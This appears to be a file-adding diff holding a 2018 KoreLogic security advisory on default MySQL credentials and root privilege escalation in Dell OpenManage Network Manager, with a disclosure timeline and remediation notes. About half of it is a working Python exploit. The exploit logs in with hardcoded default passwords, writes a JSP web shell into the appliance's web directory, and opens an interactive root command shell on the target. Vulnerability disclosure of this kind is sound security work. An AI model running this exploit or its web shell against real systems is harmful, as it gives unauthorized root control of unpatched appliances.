@@ -1,0 +1,227 @@
+'''
+KL-001-2018-009 : Dell OpenManage Network Manager Multiple Vulnerabilities
+
+Title: Dell OpenManage Network Manager Multiple Vulnerabilities
+Advisory ID: KL-001-2018-009
+Publication Date: 2018.11.05
+Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2018-009.txt
+
+
+1. Vulnerability Details
+
+     Affected Vendor: Dell
+     Affected Product: OpenManage Network Manager
+     Affected Version: 6.2.0.51 SP3
+     Platform: Embedded Linux
+     CWE Classification: CWE-285: Improper Authorization,
+                         CWE-284: Improper Access Control
+     Impact: Privilege Escalation
+     Attack vector: MySQL, HTTP
+     CVE ID: CVE-2018-15767, CVE-2018-15768
+
+2. Vulnerability Description
+
+     Dell OpenManage Network Manager exposes a MySQL listener that
+     can be accessed with default credentials (CVE-2018-15768). This
+     MySQL service is running as the root user, so an attacker can
+     exploit this configuration to, e.g., deploy a backdoor and
+     escalate privileges into the root account (CVE-2018-15767).
+
+
+3. Technical Description
+
+     The appliance binds on 3306/mysql using the 0.0.0.0 IP
+     address. The default IPTables policy is ACCEPT and the
+     rule table is empty. Using any of three default accounts,
+     a malicious user can exploit native MySQL functionality to
+     place a JSP shell into the directory of a web server on the
+     file system and subsequently make calls into it.
+
+
+4. Mitigation and Remediation Recommendation
+
+     The vendor informed KoreLogic that all default passwords can
+     be changed and are documented in the OpenManage Network Manager
+     Installation Guide. Dell recommends all customers change these
+     default passwords upon installation.
+
+     The vendor has addressed these vulnerabilities in version
+     6.5.3. Release notes and download instructions can be found at:
+
+     https://www.dell.com/support/home/us/en/04/drivers/driversdetails?driverId=5XC0J
+
+
+5. Credit
+
+     This vulnerability was discovered by Matt Bergin (@thatguylevel)
+     of KoreLogic, Inc.
+
+6. Disclosure Timeline
+
+     2018.02.16 - KoreLogic submits vulnerability details to Dell.
+     2018.02.16 - Dell acknowledges receipt.
+     2018.04.02 - Dell informs KoreLogic that a rememdiation plan is in
+                  place and requests approximately two months continued
+                  embargo on the vulnerability details.
+     2018.04.23 - 45 business days have elapsed since the vulnerability
+                  was reported to Dell.
+     2018.05.14 - 60 business days have elapsed since the vulnerability
+                  was reported to Dell.
+     2018.06.05 - 75 business days have elapsed since the vulnerability
+                  was reported to Dell.
+     2018.06.11 - Dell informs KoreLogic that the patched version has
+                  been released and asks that the KoreLogic advisory
+                  remain unpublished until 2018.06.22.
+     2018.06.21 - Dell requests additional time to coordinate changes
+                  to the MySQL implementation, noting that this
+                  driver is provided by and upstream vendor.
+     2018.07.11 - 100 business days have elapsed since the
+                  vulnerability was reported to Dell.
+     2018.07.16 - Dell informs KoreLogic that the remediations are
+                  targeted for version 6.5.3, slated for a September
+                  release.
+     2018.08.08 - 120 business days have elapsed since the
+                  vulnerability was reported to Dell.
+     2018.09.20 - 150 business days have elapsed since the
+                  vulnerability was reported to Dell.
+     2018.10.03 - Dell informs KoreLogic that version 6.5.3 is
+                  scheduled to be released 2018.10.08.
+     2018.10.11 - Dell and KoreLogic begin mutual review of
+                  disclosure statements.
+     2018.11.02 - Dell issues public advisory-
+                  https://www.dell.com/support/article/us/en/19/sln314610;
+                  180 business days have elapsed since the
+                  vulnerability was reported to Dell.
+     2018.11.05 - KoreLogic Disclosure.
+
+7. Proof of Concept
+'''
+
+     #!/usr/bin/python
+
+     # $ python dell-openmanage-networkmanager_rce.py --host 1.3.3.7
+     # Dell OpenManage NetworkManager 6.2.0.51 SP3
+     # SQL backdoor remote root
+     #
+     # [-] Starting attack.
+     # [+] Connected using root account.
+     # [+] Sending malicious SQL.
+     # [+] Dropping shell.
+     # [-] uid=0(root) gid=0(root) groups=0(root)
+     #
+     # # uname -a
+     # Linux synergy.domain.int 2.6.32-642.6.2.el6.x86_64 #1 SMP Wed Oct 26 06:52:09 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+
+     from optparse import OptionParser
+     from string import ascii_letters, digits
+     from random import choice
+     from re import compile as regex_compile
+     from urllib import urlopen
+     import pymysql.cursors
+
+     banner = """Dell OpenManage NetworkManager 6.2.0.51 SP3\nSQL backdoor remote root\n"""
+     accounts = ['root','owmeta','oware']
+     password = 'dorado'
+     regex = regex_compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
+
+     full_path = '/opt/VAroot/dell/openmanage/networkmanager/oware/synergy/tomcat-7.0.40/webapps/nvhelp/%s.jsp' % (''.join(
+         [choice(digits + ascii_letters) for i in xrange(8)]))
+     shell_name = full_path.split('/')[-1]
+
+     backdoor = """<%@ page import="java.util.*,java.io.*"%>
+     <%
+     if (request.getParameter("cmd") != null) {
+         String m = request.getParameter("cmd");
+         Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+         OutputStream os = p.getOutputStream();
+         InputStream in = p.getInputStream();
+         DataInputStream dis = new DataInputStream(in);
+         String disr = dis.readLine();
+         while ( disr != null ) {
+             out.println(disr);
+             disr = dis.readLine();
+         }
+     }
+     %>
+
+     def do_shell(ip_address):
+         fd = urlopen("http://%s:8080/nvhelp/%s" % (ip_address,shell_name),"cmd=%s" % ('sudo sh -c id'))
+         print "[-] %s\n" % fd.read().strip()
+         fd.close()
+         while True:
+             try:
+                 cmd = 'sudo sh -c %s' % raw_input("# ")
+                 if ('exit' in cmd or 'quit' in cmd):
+                     break
+                 fd = urlopen("http://%s:8080/nvhelp/%s" % (ip_address,shell_name),"cmd=%s" % (cmd))
+                 print fd.read().strip()
+                 fd.close()
+             except KeyboardInterrupt:
+                 print "Exiting."
+                 exit(0)
+         return False
+
+     if __name__=="__main__":
+       print banner
+       parser = OptionParser()
+       parser.add_option("--host",dest="host",default=None,help="Target IP address")
+       o, a = parser.parse_args()
+       if o.host is None:
+           print "[!] Please provide the required parameters."
+           exit(1)
+       elif not regex.match(o.host):
+           print "[!] --host must contain an IP address."
+           exit(1)
+       else:
+           print "[-] Starting attack."
+           try:
+               for user in accounts:
+                   conn = pymysql.connect(host=o.host,
+                                          user=user,
+                                          password=password,
+                                          db='mysql',
+                                          cursorclass=pymysql.cursors.DictCursor
+                                         )
+                   if conn.user is user:
+                       print "[+] Connected using %s account." % (user)
+                       cursor = conn.cursor()
+                       print "[+] Sending malicious SQL."
+                       table_name = ''.join(
+                           [choice(digits + ascii_letters) for i in xrange(8)])
+                       column_name = ''.join(
+                           [choice(digits + ascii_letters) for i in xrange(8)])
+                       cursor.execute('create table %s (%s text)' % (table_name, column_name))
+                       cursor.execute("insert into %s (%s) values ('%s')" % (table_name, column_name, backdoor))
+                       conn.commit()
+                       cursor.execute('select * from %s into outfile "%s" fields escaped by ""' % (table_name,full_path))
+                       cursor.execute('drop table if exists `%s`' % (table_name))
+                       conn.commit()
+                       cursor.execute('flush logs')
+                       print "[+] Dropping shell."
+                       do_shell(o.host)
+                       break
+           except Exception as e:
+               if e[0] == '1045':
+                   print "[!] Hardcoded SQL credentials failed." % (e)
+               else:
+                   print "[!] Could not execute attack. Reason: %s." % (e)
+               exit(0)
+
+'''
+The contents of this advisory are copyright(c) 2018
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+KoreLogic, Inc. is a founder-owned and operated company with a
+proven track record of providing security services to entities
+ranging from Fortune 500 to small and mid-sized companies. We
+are a highly skilled team of senior security consultants doing
+by-hand security assessments for the most important networks in
+the U.S. and around the world. We are also developers of various
+tools and resources aimed at helping the security community.
+https://www.korelogic.com/about-korelogic.html
+
+Our public vulnerability disclosure policy is available at:
+https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v2.2.txt
+'''
